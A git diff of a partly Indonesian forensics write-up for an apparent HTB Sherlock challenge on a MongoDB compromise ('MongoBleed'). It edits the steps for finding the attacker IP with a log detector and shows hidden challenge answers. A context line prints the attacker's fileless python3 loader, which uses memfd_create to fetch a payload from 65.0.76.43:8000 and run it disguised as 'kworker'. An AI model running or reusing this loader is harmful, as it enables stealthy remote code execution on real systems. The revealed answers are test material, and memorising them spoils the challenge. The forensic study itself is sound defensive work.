@@ -47,18 +47,23 @@ Perform a rapid triage analysis of the collected artifacts to determine whether 
 
 ### Task 3: Attacker IP
 **Question:** Analyze the MongoDB logs to identify the attacker’s remote IP address used to exploit the CVE.
+<img width="1107" height="349" alt="image" src="https://github.com/user-attachments/assets/2bd5f504-30ef-4af9-bcac-d952cdb9bdad" />
 
-* **Method:** Check Mongo Log yang ada di `📂uac-mongodbsync-linux-triage/[root]/var/log/mongodb/` setelah di ekstrak, Untuk mendapatkan version bisa menggunakan command berikut : 
-
-
+* **Method:** Check IP Address Attacker melalui log mongo.log di direktori `📂uac-mongodbsync-linux-triage/[root]/var/log/mongodb/` bisa menggunakan tools mongobleed detector `https://github.com/Neo23x0/mongobleed-detector` dan menggunakan command berikut : 
+ ```bash
+    <lokasi tools> -t <jumlahWaktuMundur> --no-default-paths -p mongo.log
+    ~/HTB/Sherlock/MongoBleed/mongobleed-detector/mongobleed-detector.sh -t 119420 --no-default-paths -p mongod.log 
+```
 <details>
 <summary>Click to see answer</summary>
 
 **Answer:** `65.0.76.43`
 </details>
 
+
 ### Task 4: Exploitation Start Time
-**Question:** Determine the exact date and time the attacker’s exploitation activity began.
+**Question:** 
+Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event)
 <details>
 <summary>Click to see answer</summary>
 
@@ -91,7 +96,6 @@ Perform a rapid triage analysis of the collected artifacts to determine whether 
 ```bash
 python3 -c 'import os,sys,urllib.request;import ctypes;M=ctypes.CDLL(None);M.syscall.restype=ctypes.c_int;fd=M.syscall(319,b"",1);m=open(fd,"wb");m.write(urllib.request.urlopen("[http://65.0.76.43:8000/lin](http://65.0.76.43:8000/lin)").read());m.close();os.execv(f"/proc/self/fd/{fd}",["kworker"])'
 ```
-
 </details>
 
 ---
